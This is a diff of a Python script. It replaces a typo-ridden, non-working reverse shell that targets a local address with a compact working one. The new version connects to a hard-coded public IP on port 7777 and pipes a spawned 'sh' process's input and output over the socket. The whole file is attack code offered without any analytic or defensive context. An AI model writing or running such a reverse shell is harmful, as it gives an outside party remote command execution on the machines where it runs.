@@ -1,42 +1,29 @@
-import socket
-import time
-import subprocess
+import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
 
-def relible_send(data):
-        jsondata = json.dumps(data)
-        s.send(jsondata.encode())
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
 
-def relible_recv():
-        data = ''
-        while True:
-                try:
-                        data = data + s.recv(1024).decode().rstip()
-                        return json.loaads(data)
-                except ValueError:
-                        continue
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("91.77.169.183",7777))
 
-def connection():
-	while True:
-		teme.sleep(20)
-		try:
-			s.connect(("192.168.1.144' 5555))
-			shell()
-			s.close()
-			break
-		except:
-			connection()
+p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
-def shell():
-	while True:
-		command == reliable_recv()
-		if command == 'quit':
-			break
-		else:
-			ececute = subprocess.Popen(command, shell=True. stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			result - execute.stdout.read() + execute.stderr.read()
-			result = result.decode()
-			relible_send(result)
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
 
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection()
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
